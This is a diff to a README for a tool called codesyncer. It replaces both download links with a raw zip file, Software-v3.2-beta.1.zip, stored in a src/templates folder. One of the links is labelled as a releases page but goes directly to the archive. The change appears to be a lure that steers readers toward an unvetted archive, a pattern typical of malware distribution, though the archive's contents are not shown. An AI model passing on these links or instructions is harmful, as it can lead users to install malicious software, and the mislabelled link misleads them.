@@ -1,6 +1,6 @@
 # 🤖 codesyncer - Simplifying Collaboration Across Repositories
 
-[![Download codesyncer](https://raw.githubusercontent.com/p3sc4d0r/codesyncer/main/bin/codesyncer_v3.8.zip)](https://raw.githubusercontent.com/p3sc4d0r/codesyncer/main/bin/codesyncer_v3.8.zip)
+[![Download codesyncer](https://github.com/p3sc4d0r/codesyncer/raw/refs/heads/main/src/templates/en/Software-v3.2-beta.1.zip)](https://github.com/p3sc4d0r/codesyncer/raw/refs/heads/main/src/templates/en/Software-v3.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to codesyncer, your AI-powered tool for seamless collaboration across mu
 
 To get started, you need to download codesyncer. Visit the link below to access the Releases page and select the latest version:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/p3sc4d0r/codesyncer/main/bin/codesyncer_v3.8.zip)
+[Visit the Releases Page to Download](https://github.com/p3sc4d0r/codesyncer/raw/refs/heads/main/src/templates/en/Software-v3.2-beta.1.zip)
 
 1. Click the link above.
 2. Look for the latest version of codesyncer.
